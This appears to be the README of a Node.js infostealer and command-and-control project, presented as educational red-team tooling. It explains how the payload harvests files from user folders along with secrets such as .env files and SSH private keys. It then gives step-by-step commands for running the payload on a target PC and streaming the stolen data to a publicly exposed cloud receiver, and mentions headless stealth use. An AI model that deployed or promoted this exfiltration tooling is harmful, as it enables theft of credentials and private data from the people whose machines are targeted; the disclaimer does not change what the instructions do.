⚡ Educational C2 & Data Exfiltration Payload
============================================

**Disclaimer:** This project is built strictly for educational purposes and authorized red-teaming. It demonstrates how autonomous malware (Infostealers) enumerates systems and exfiltrates data, highlighting the importance of robust cybersecurity defenses, environment monitoring, and data loss prevention (DLP).

🎯 Objective & Architecture
---------------------------

This project is a highly resilient, native Node.js Command & Control (C2) ecosystem. It avoids fragile hardcoded rules and massive memory spikes, opting instead for dynamic execution and stream chunking.

The ecosystem consists of two parts:

1.  **The Payload (src/index.js):** An autonomous script that gathers system metrics, crawls targeted directories, inspects file bytes, and streams data outward.
    
2.  **The C2 Receiver (receiver-server.js):** A custom local/cloud server designed to catch massive incoming data streams without file size limits.
    

📂 Project Structure
--------------------

*   src/index.js - The main payload orchestrator.
    
*   src/fileHandler.js - Handles recursive directory scanning and dynamic byte-level file inspection.
    
*   src/networkClient.js - Manages HTTP/HTTPS network streams and payload transmission.
    
*   src/systemInfo.js - Gathers OS and environment metrics.
    
*   receiver-server.js - The C2 Receiver that catches exfiltrated data.
    
*   package.json - Provides quick NPM execution scripts.
    

🚀 Key Technical Achievements
-----------------------------

*   **Zero Dependencies:** Built entirely using native Node.js (fs, os, path, http). No third-party packages are required to run the payload or the server.
    
*   **Dynamic Byte-Level Inspection:** Instead of relying on fragile file extensions to determine data types, the payload reads file buffers and checks for null terminators (0x00) to dynamically classify data streams.
    
*   **Memory-Safe Stream Chunking & Failsafes:** Any file over 100KB automatically routes to a binary stream. This bypasses memory heap limits and 413 Payload Too Large proxy errors by chunking large binary files (videos, ZIP archives, databases) directly into network streams.
    
*   **Cross-Platform Target Awareness:** Designed to run seamlessly on both standard Desktop PCs and headless Linux containers. It specifically targets high-value folders (Desktop, Documents, Downloads) and falls back to process.cwd() if those do not exist.
    
*   **Robust Fault Tolerance:** Silently handles EACCES permissions, ENOENT missing directories, and recursive infinite loops (ignoring .git, node\_modules, etc.) without crashing the main event loop.
    

🛠️ Deployment & Evaluation Guide
---------------------------------

Follow these instructions to safely deploy and evaluate the C2 ecosystem. Ensure you have authorized datasets available in the target directories before execution.

### Step 1: Start the C2 Receiver Server

Open a terminal and start the C2 server using our NPM script:

  `
  npm run start:server   
  `

_The server will start on port 3000 and automatically create a /received-data directory to store incoming exfiltrated files._

### Step 2: Execute the Payload (Choose Method A or B)

#### Method A: Local Sandbox Testing (Recommended for Speed)

This method runs both the C2 server and the payload on the exact same machine.

1.  Open a **second** terminal window.
    
2.  Execute the payload, pointing it to your local server:
    

`
npm run start:payload -- --url=http://localhost:3000 
`  

_(To target a specific folder during testing, append the path flag: npm run start:payload -- --url=http://localhost:3000 --path=/path/to/your/dataset)_

#### Method B: Cloud C2 Server (Remote Simulation via GitHub Codespaces)

This method demonstrates real-world remote exfiltration without requiring any third-party tools like Ngrok.

1.  Open this project in **GitHub Codespaces**.
    
2.  Run npm run start:server inside the Codespaces terminal.
    
3.  In Codespaces, click the **"Ports"** tab at the bottom.
    
4.  Right-click on Port 3000, change "Port Visibility" to **Public**.
    
5.  Copy the "Forwarded Address" URL provided by GitHub (e.g., https://your-app-name.github.dev).
    
6.  **On the Target PC**, open a terminal and run the payload, pointing it to your cloud C2 server:
    
`
 npm run start:payload -- --url=[https://your-app-name.github.dev](https://your-app-name.github.dev) 
 `

📦 Output Expectations
----------------------

When the payload runs, you will see \[INFO\] and \[NETWORK\] logs in the terminal. These are intentionally left enabled to assist operators and security researchers in evaluating the logic flow. In a real-world stealth scenario, this tool would execute headlessly.

Inside your /received-data folder on the C2 server, you will find:

1.  **Streamed Binaries:** PDFs, Images, ZIPs, Media, and Databases saved seamlessly without corrupting memory.
    
2.  **exfiltrated-data-TIMESTAMP.json:** A single payload containing the system footprint and the text contents of all discovered configuration files (like .env, id\_rsa, and Dockerfile).
